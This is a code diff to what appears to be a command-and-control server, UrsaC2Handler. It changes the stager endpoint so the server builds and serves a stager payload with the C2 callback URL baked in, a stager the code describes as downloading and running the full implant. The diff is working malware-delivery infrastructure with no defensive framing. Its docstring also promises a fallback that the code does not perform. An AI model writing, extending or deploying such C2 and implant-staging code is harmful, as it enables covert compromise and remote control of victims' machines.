@@ -33,6 +33,7 @@ from urllib.parse import urlparse
 # Add parent to path for imports
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+from implants.builder import Builder as _PayloadBuilder
 from major.config import get_config, reload_config
 from major.crypto import UrsaCrypto, generate_session_key
 from major.db import (
@@ -306,22 +307,37 @@ class UrsaC2Handler(BaseHTTPRequestHandler):
         self.wfile.write(f["data"])
 
     def _handle_stage(self):
-        """Serve a stager payload.
+        """Serve a stager payload with the C2 URL baked in.
 
-        The stager is a minimal script that downloads and runs the full implant.
+        Uses the payload builder to substitute URSA_C2_URL in stager.py so
+        the served stager already knows where to phone home.  Falls back to
+        the raw stager.py (token un-substituted) if the builder fails.
         """
-        # Check for stager file
-        stager_path = os.path.join(os.path.dirname(__file__), "..", "implants", "stager.py")
-        if os.path.exists(stager_path):
-            with open(stager_path, "rb") as f:
-                payload = f.read()
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain")
-            self.send_header("Content-Length", str(len(payload)))
-            self.end_headers()
-            self.wfile.write(payload)
-        else:
+        host, port = self.server.server_address
+        cfg = get_config()
+        public_url = cfg.get("major.public_url", "")
+        if not public_url:
+            # Derive from bind address; replace 0.0.0.0 with loopback as fallback
+            effective_host = host if host not in ("0.0.0.0", "") else "127.0.0.1"
+            public_url = f"http://{effective_host}:{port}"
+
+        try:
+            source = _PayloadBuilder().build_stager(public_url)
+            payload = source.encode()
+        except FileNotFoundError:
+            # No stager.py present at all
             self._send_json({"error": "no stager configured"}, 404)
+            return
+        except Exception as exc:
+            _log(f"[!] Stager build error: {exc}")
+            self._send_json({"error": "stager build failed"}, 500)
+            return
+
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(payload)))
+        self.end_headers()
+        self.wfile.write(payload)
 
 
 # ── Session Reaper ──
